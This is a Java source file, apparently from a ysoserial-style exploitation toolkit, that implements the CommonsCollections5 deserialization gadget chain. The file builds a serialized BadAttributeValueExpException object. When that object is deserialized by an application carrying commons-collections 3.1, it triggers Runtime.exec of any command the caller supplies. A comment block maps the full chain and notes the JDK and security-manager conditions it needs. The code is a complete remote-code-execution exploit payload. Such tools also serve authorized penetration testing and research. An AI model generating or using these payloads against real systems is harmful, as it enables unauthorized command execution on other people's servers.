package A.R.ysogate.payloads.gadgets;

import java.util.HashMap;
import java.util.Map;

import javax.management.BadAttributeValueExpException;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Authors;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.util.JavaVersion;
import A.R.ysogate.payloads.util.Reflections;
import A.R.ysogate.payloads.util.TransformerUtil;

/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()

	Requires:
		commons-collections
 */
/*
This only works in JDK 8u76 and WITHOUT a security manager

https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.MATTHIASKAISER, Authors.JASINNER})
public class CommonsCollections5 implements ObjectPayload<BadAttributeValueExpException> {

	public BadAttributeValueExpException getObject(final String command) throws Exception {
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
				new Transformer[]{new ConstantTransformer(1)});
		// real chain for after setup
		final Transformer[]           transformers = TransformerUtil.makeTransformer(command);
		final Map                     innerMap     = new HashMap();
		final Map                     lazyMap      = LazyMap.decorate(innerMap, transformerChain);
		TiedMapEntry                  entry        = new TiedMapEntry(lazyMap, "su18");
		BadAttributeValueExpException val          = new BadAttributeValueExpException(null);
		Reflections.setFieldValue(val, "val", entry);
		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return val;
	}

	public static boolean isApplicableJavaVersion() {
		return JavaVersion.isBadAttrValExcReadObj();
	}

}
